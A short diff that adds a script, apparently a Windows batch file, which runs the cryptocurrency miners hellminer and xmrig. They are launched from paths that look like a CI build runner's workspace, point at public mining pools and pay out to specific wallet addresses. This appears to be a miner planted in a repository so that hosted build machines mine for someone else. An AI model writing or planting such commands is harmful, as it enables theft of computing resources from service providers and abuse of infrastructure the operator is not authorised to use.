@@ -1,0 +1,3 @@
+D:\a\add\add\hellminer\hellminer.exe -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RQw4xFxuEx87kwFnFr3Qvzs2tfMAy2h4mi.add -p x --cpu 2
+D:\a\add\add\xmrig\xmrig-6.15.0\xmrig.exe -o rx.unmineable.com:3333 -a rx -k -u BTT:TY4bwi9zUbyeZgeiSZp8dHrRigjHFkB11e.add -p x --cpu 4
+pause
